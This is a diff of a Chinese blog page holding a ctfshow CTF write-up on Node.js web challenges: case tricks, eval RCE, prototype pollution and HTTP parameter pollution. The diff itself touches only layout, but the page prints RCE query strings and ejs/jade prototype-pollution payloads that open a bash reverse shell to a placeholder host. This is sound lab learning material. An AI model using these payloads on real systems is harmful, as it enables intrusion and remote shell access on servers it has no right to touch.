@@ -14,9 +14,8 @@
 <meta property="og:description" content="nodejs学习">
 <meta property="og:locale" content="zh_CN">
 <meta property="article:published_time" content="2023-01-03T13:10:33.000Z">
-<meta property="article:modified_time" content="2023-01-21T07:19:42.421Z">
+<meta property="article:modified_time" content="2023-12-24T05:47:40.710Z">
 <meta property="article:author" content="killeveee">
-<meta property="article:tag" content="CTF">
 <meta name="twitter:card" content="summary">
     
     
@@ -70,13 +69,11 @@
         <!--
        --><li><a href="/">首页</a></li><!--
      --><!--
-       --><li><a href="/about/">关于</a></li><!--
-     --><!--
        --><li><a href="/archives/">归档</a></li><!--
      --><!--
        --><li><a href="/categories/">分类</a></li><!--
      --><!--
-       --><li><a href="/tags/">Tags</a></li><!--
+       --><li><a href="/about/">关于</a></li><!--
      -->
       </ul>
     </span>
@@ -117,7 +114,7 @@
     
     
       <div id="toc">
-        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#web334-JS%E5%A4%A7%E5%B0%8F%E5%86%99%E7%89%B9%E6%80%A7"><span class="toc-number">1.</span> <span class="toc-text">web334 JS大小写特性</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web335-JS-%E7%9A%84-RCE"><span class="toc-number">2.</span> <span class="toc-text">web335 JS 的 RCE</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web336-%E6%9C%89%E8%BF%87%E6%BB%A4%E7%9A%84RCE"><span class="toc-number">3.</span> <span class="toc-text">web336 有过滤的RCE</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web337-js%E5%8F%98%E9%87%8F"><span class="toc-number">4.</span> <span class="toc-text">web337 js变量</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web338-%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93"><span class="toc-number">5.</span> <span class="toc-text">web338 原型链污染</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web339-%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93"><span class="toc-number">6.</span> <span class="toc-text">web339 原型链污染</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web340-%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93"><span class="toc-number">7.</span> <span class="toc-text">web340 原型链污染</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web341-ejs-rce"><span class="toc-number">8.</span> <span class="toc-text">web341 ejs rce</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web342%E3%80%81343-jade%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93"><span class="toc-number">9.</span> <span class="toc-text">web342、343 jade原型链污染</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web344-HTTP%E5%8F%82%E6%95%B0%E6%B1%A1%E6%9F%93"><span class="toc-number">10.</span> <span class="toc-text">web344 HTTP参数污染</span></a></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">1.</span> <span class="toc-text">web334 JS大小写特性</span></a></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">2.</span> <span class="toc-text">web335 JS 的 RCE</span></a></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">3.</span> <span class="toc-text">web336 有过滤的RCE</span></a></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">4.</span> <span class="toc-text">web337 js变量</span></a></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">5.</span> <span class="toc-text">web338 原型链污染</span></a></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">6.</span> <span class="toc-text">web339 原型链污染</span></a></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">7.</span> <span class="toc-text">web340 原型链污染</span></a></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">8.</span> <span class="toc-text">web341 ejs rce</span></a></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">9.</span> <span class="toc-text">web342、343 jade原型链污染</span></a></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">10.</span> <span class="toc-text">web344 HTTP参数污染</span></a></li></ol>
       </div>
     
   </span>
@@ -155,11 +152,6 @@
 
 
       
-    <div class="article-tag">
-        <i class="fa-solid fa-tag"></i>
-        <a class="p-category" href="/tags/CTF/" rel="tag">CTF</a>
-    </div>
-
 
     </div>
   </header>
@@ -171,7 +163,7 @@
 <li><a target="_blank" rel="noopener" href="https://blog.csdn.net/miuzzx/article/details/111780832">CTFSHOW nodejs篇_yu22x的博客-CSDN博客</a></li>
 <li><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/7184">Node.js 常见漏洞学习与总结 - 先知社区 (aliyun.com)</a></li>
 </ul>
-<h1 id="web334-JS大小写特性"><a href="#web334-JS大小写特性" class="headerlink" title="web334 JS大小写特性"></a>web334 JS大小写特性</h1><p>这题纯纯考看代码。</p>
+<h1><span id="web334-js大小写特性">web334 JS大小写特性</span></h1><p>这题纯纯考看代码。</p>
 <p>user.js 发现 <code>username: &#39;CTFSHOW&#39;, password: &#39;123456&#39;</code></p>
 <p>login.js 里有这么一段代码：</p>
 <pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token keyword">var</span> <span class="token function-variable function">findUser</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">name<span class="token punctuation">,</span> password</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
@@ -208,7 +200,7 @@
 Character.toLowerCase()函数，字符İ会转变为i，字符K会转变为k<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 
 <p>学习一波~</p>
-<h1 id="web335-JS-的-RCE"><a href="#web335-JS-的-RCE" class="headerlink" title="web335 JS 的 RCE"></a>web335 JS 的 RCE</h1><p>本题带我们了解掌握 Node.JS 的 RCE。</p>
+<h1><span id="web335-js-的-rce">web335 JS 的 RCE</span></h1><p>本题带我们了解掌握 Node.JS 的 RCE。</p>
 <p>在js中，<code>eval()</code>方法用于计算字符串，并把它作为<u>脚本代码来执行</u>。<a target="_blank" rel="noopener" href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/eval">eval() - JavaScript</a></p>
 <p>payload里利用到的child_process： <a target="_blank" rel="noopener" href="http://nodejs.cn/api/child_process.html#child-process">child_process 子进程 | Node.js API 文档</a></p>
 <p>PAYLOAD：</p>
@@ -232,14 +224,14 @@ Character.toLowerCase()函数，字符İ会转变为i，字符K会转变为k<s
 
 
 
-<h1 id="web336-有过滤的RCE"><a href="#web336-有过滤的RCE" class="headerlink" title="web336 有过滤的RCE"></a>web336 有过滤的RCE</h1><p>继上一题RCE，过滤了<code>exec|load</code>。姿势还是很多d。</p>
+<h1><span id="web336-有过滤的rce">web336 有过滤的RCE</span></h1><p>继上一题RCE，过滤了<code>exec|load</code>。姿势还是很多d。</p>
 <pre class="line-numbers language-none"><code class="language-none">?eval&#x3D;require( &#39;child_process&#39; ).spawnSync( &#39;ls&#39;, [ &#39;.&#39; ] ).stdout.toString()
 ?eval&#x3D;require( &#39;child_process&#39; ).spawnSync( &#39;cat&#39;, [ &#39;f*&#39; ] ).stdout.toString()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 
 <p>补充：</p>
 <p><code>__filename</code>：返回当前模块文件被解析过后的绝对路径。</p>
 <p><code>__dirname</code>：返回当前模块文件解析过后所在的文件夹(目录)的绝对路径。</p>
-<h1 id="web337-js变量"><a href="#web337-js变量" class="headerlink" title="web337 js变量"></a>web337 js变量</h1><p>这题考察对于 js变量 的理解。<br>js变量分为：值类型(基本类型)、引用数据类型（对象类型）。</p>
+<h1><span id="web337-js变量">web337 js变量</span></h1><p>这题考察对于 js变量 的理解。<br>js变量分为：值类型(基本类型)、引用数据类型（对象类型）。</p>
 <p>题目源码：</p>
 <pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token keyword">var</span> express <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'express'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token keyword">var</span> router <span class="token operator">=</span> express<span class="token punctuation">.</span><span class="token function">Router</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
@@ -294,7 +286,7 @@ console<span class="token punctuation">.</span><span class="token function">log<
 console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>b<span class="token operator">+</span><span class="token string">"flag&#123;xxx&#125;"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p>打印出来的结果是<code>1flag&#123;xxx&#125;</code>和<code>2flag&#123;xxx&#125;</code>，md5就会是不一样的了。</p>
-<h1 id="web338-原型链污染"><a href="#web338-原型链污染" class="headerlink" title="web338 原型链污染"></a>web338 原型链污染</h1><p>本题考察简单的 <u>原型链污染</u>。</p>
+<h1><span id="web338-原型链污染">web338 原型链污染</span></h1><p>本题考察简单的 <u>原型链污染</u>。</p>
 <p>学习链接：</p>
 <ul>
 <li><p><a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/javascript-prototype-pollution-attack.html">深入理解 JavaScript Prototype 污染攻击 | 离别歌 (leavesongs.com)</a></p>
@@ -355,7 +347,7 @@ module<span class="token punctuation">.</span>exports <span class="token operato
    res.end(flag);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 
 <p>判断为真，所以输出flag</p>
-<h1 id="web339-原型链污染"><a href="#web339-原型链污染" class="headerlink" title="web339 原型链污染"></a>web339 原型链污染</h1><p>和上一题的区别是：</p>
+<h1><span id="web339-原型链污染">web339 原型链污染</span></h1><p>和上一题的区别是：</p>
 <pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token keyword">if</span><span class="token punctuation">(</span>secert<span class="token punctuation">.</span>ctfshow<span class="token operator">===</span>flag<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
   res<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 
@@ -415,7 +407,7 @@ module<span class="token punctuation">.</span>exports <span class="token operato
 
 
 
-<h1 id="web340-原型链污染"><a href="#web340-原型链污染" class="headerlink" title="web340 原型链污染"></a>web340 原型链污染</h1><p>和上一题差不多，只不过这里不一样：</p>
+<h1><span id="web340-原型链污染">web340 原型链污染</span></h1><p>和上一题差不多，只不过这里不一样：</p>
 <pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token keyword">var</span> user <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
   <span class="token keyword">this</span><span class="token punctuation">.</span>userinfo <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
   <span class="token keyword">this</span><span class="token punctuation">.</span>isVIP <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
@@ -436,21 +428,21 @@ utils<span class="token punctuation">.</span><span class="token function">copy</
 
 
 
-<h1 id="web341-ejs-rce"><a href="#web341-ejs-rce" class="headerlink" title="web341 ejs rce"></a>web341 ejs rce</h1><p>预期解ejs rce</p>
+<h1><span id="web341-ejs-rce">web341 ejs rce</span></h1><p>预期解ejs rce</p>
 <p>先进行一下原型链污染，再刷新一次即可</p>
 <p>payload:</p>
 <pre class="line-numbers language-none"><code class="language-none">&#123;&quot;__proto__&quot;:&#123;&quot;__proto__&quot;:&#123;&quot;outputFunctionName&quot;:&quot;_tmp1;global.process.mainModule.require(&#39;child_process&#39;).exec(&#39;bash -c \&quot;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;xxx&#x2F;xxx 0&gt;&amp;1\&quot;&#39;);var __tmp2&quot;&#125;&#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 
 
-<h1 id="web342、343-jade原型链污染"><a href="#web342、343-jade原型链污染" class="headerlink" title="web342、343 jade原型链污染"></a>web342、343 jade原型链污染</h1><p><strong>jade原型链污染</strong></p>
+<h1><span id="web342-343-jade原型链污染">web342、343 jade原型链污染</span></h1><p><strong>jade原型链污染</strong></p>
 <p>payload:</p>
 <pre class="line-numbers language-none"><code class="language-none">&#123;&quot;__proto__&quot;:&#123;&quot;__proto__&quot;: &#123;&quot;type&quot;:&quot;Block&quot;,&quot;nodes&quot;:&quot;&quot;,&quot;compileDebug&quot;:1,&quot;self&quot;:1,&quot;line&quot;:&quot;global.process.mainModule.require(&#39;child_process&#39;).exec(&#39;bash -c \&quot;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;xxx&#x2F;810&gt;&amp;1\&quot;&#39;)&quot;&#125;&#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p>在login页面打上去之后随便访问下，就会反弹。</p>
 <p><a target="_blank" rel="noopener" href="https://lonmar.cn/2021/02/22/%E5%87%A0%E4%B8%AAnode%E6%A8%A1%E6%9D%BF%E5%BC%95%E6%93%8E%E7%9A%84%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E5%88%86%E6%9E%90/">几个node模板引擎的原型链污染分析 | L0nm4r (lonmar.cn)</a></p>
 <p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/7025">https://xz.aliyun.com/t/7025</a></p>
-<h1 id="web344-HTTP参数污染"><a href="#web344-HTTP参数污染" class="headerlink" title="web344 HTTP参数污染"></a>web344 HTTP参数污染</h1><p>HTTP参数污染。</p>
+<h1><span id="web344-http参数污染">web344 HTTP参数污染</span></h1><p>HTTP参数污染。</p>
 <p>部分源码：</p>
 <pre class="line-numbers language-js" data-language="js"><code class="language-js">router<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res<span class="token punctuation">,</span> next</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
   res<span class="token punctuation">.</span><span class="token function">type</span><span class="token punctuation">(</span><span class="token string">'html'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
@@ -495,13 +487,11 @@ utils<span class="token punctuation">.</span><span class="token function">copy</
         
           <li><a href="/">首页</a></li>
         
-          <li><a href="/about/">关于</a></li>
-        
           <li><a href="/archives/">归档</a></li>
         
           <li><a href="/categories/">分类</a></li>
         
-          <li><a href="/tags/">Tags</a></li>
+          <li><a href="/about/">关于</a></li>
         
       </ul>
     </div>
@@ -509,7 +499,7 @@ utils<span class="token punctuation">.</span><span class="token function">copy</
     
     
       <div id="toc-footer" style="display: none">
-        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#web334-JS%E5%A4%A7%E5%B0%8F%E5%86%99%E7%89%B9%E6%80%A7"><span class="toc-number">1.</span> <span class="toc-text">web334 JS大小写特性</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web335-JS-%E7%9A%84-RCE"><span class="toc-number">2.</span> <span class="toc-text">web335 JS 的 RCE</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web336-%E6%9C%89%E8%BF%87%E6%BB%A4%E7%9A%84RCE"><span class="toc-number">3.</span> <span class="toc-text">web336 有过滤的RCE</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web337-js%E5%8F%98%E9%87%8F"><span class="toc-number">4.</span> <span class="toc-text">web337 js变量</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web338-%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93"><span class="toc-number">5.</span> <span class="toc-text">web338 原型链污染</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web339-%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93"><span class="toc-number">6.</span> <span class="toc-text">web339 原型链污染</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web340-%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93"><span class="toc-number">7.</span> <span class="toc-text">web340 原型链污染</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web341-ejs-rce"><span class="toc-number">8.</span> <span class="toc-text">web341 ejs rce</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web342%E3%80%81343-jade%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93"><span class="toc-number">9.</span> <span class="toc-text">web342、343 jade原型链污染</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web344-HTTP%E5%8F%82%E6%95%B0%E6%B1%A1%E6%9F%93"><span class="toc-number">10.</span> <span class="toc-text">web344 HTTP参数污染</span></a></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">1.</span> <span class="toc-text">web334 JS大小写特性</span></a></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">2.</span> <span class="toc-text">web335 JS 的 RCE</span></a></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">3.</span> <span class="toc-text">web336 有过滤的RCE</span></a></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">4.</span> <span class="toc-text">web337 js变量</span></a></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">5.</span> <span class="toc-text">web338 原型链污染</span></a></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">6.</span> <span class="toc-text">web339 原型链污染</span></a></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">7.</span> <span class="toc-text">web340 原型链污染</span></a></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">8.</span> <span class="toc-text">web341 ejs rce</span></a></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">9.</span> <span class="toc-text">web342、343 jade原型链污染</span></a></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">10.</span> <span class="toc-text">web344 HTTP参数污染</span></a></li></ol>
       </div>
     
 
@@ -557,13 +547,11 @@ utils<span class="token punctuation">.</span><span class="token function">copy</
         <!--
        --><li><a href="/">首页</a></li><!--
      --><!--
-       --><li><a href="/about/">关于</a></li><!--
-     --><!--
        --><li><a href="/archives/">归档</a></li><!--
      --><!--
        --><li><a href="/categories/">分类</a></li><!--
      --><!--
-       --><li><a href="/tags/">Tags</a></li><!--
+       --><li><a href="/about/">关于</a></li><!--
      -->
       </ul>
     </nav>
